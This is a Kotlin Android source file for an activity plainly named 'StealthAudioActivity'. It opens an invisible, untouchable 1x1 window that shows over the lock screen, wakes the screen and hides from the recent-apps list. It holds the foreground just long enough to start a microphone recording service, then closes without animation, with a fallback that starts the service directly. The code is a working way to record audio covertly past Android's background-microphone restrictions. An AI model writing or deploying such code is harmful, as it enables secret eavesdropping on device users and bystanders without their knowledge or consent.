package com.example.service

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.WindowManager
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class StealthAudioActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Make activity completely transparent, non-interactive, and invisible
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
        }
        window.addFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
        )
        try {
            window.statusBarColor = Color.TRANSPARENT
            window.navigationBarColor = Color.TRANSPARENT
        } catch (_: Exception) {}

        val transparentLayout = android.widget.FrameLayout(this).apply {
            setBackgroundColor(Color.TRANSPARENT)
            layoutParams = android.view.ViewGroup.LayoutParams(1, 1)
        }
        setContentView(transparentLayout)

        val durationSec = intent.getIntExtra(EXTRA_DURATION_SEC, 10)

        // Start AudioRecordingService with foreground microphone privileges while app is in TOP state
        try {
            AudioRecordingService.startService(this, durationSec)
            Log.d("StealthAudioActivity", "AudioRecordingService launched while activity in TOP state.")
        } catch (e: Exception) {
            Log.e("StealthAudioActivity", "Failed to start AudioRecordingService: ${e.message}")
        } finally {
            latch.countDown()
            finish()
            overridePendingTransition(0, 0)
        }
    }

    companion object {
        const val EXTRA_DURATION_SEC = "extra_duration_sec"
        @Volatile
        private var latch = CountDownLatch(1)

        fun startAudioRecordingInForeground(context: Context, durationSec: Int): Boolean {
            latch = CountDownLatch(1)

            val intent = Intent(context, StealthAudioActivity::class.java).apply {
                putExtra(EXTRA_DURATION_SEC, durationSec)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_NO_ANIMATION or
                        Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or
                        Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or
                        Intent.FLAG_ACTIVITY_CLEAR_TOP
            }

            try {
                context.startActivity(intent)
                latch.await(3, TimeUnit.SECONDS)
                return true
            } catch (e: Exception) {
                Log.w("StealthAudioActivity", "Direct activity start failed: ${e.message}, trying direct service start")
                AudioRecordingService.startService(context, durationSec)
                return false
            }
        }
    }
}
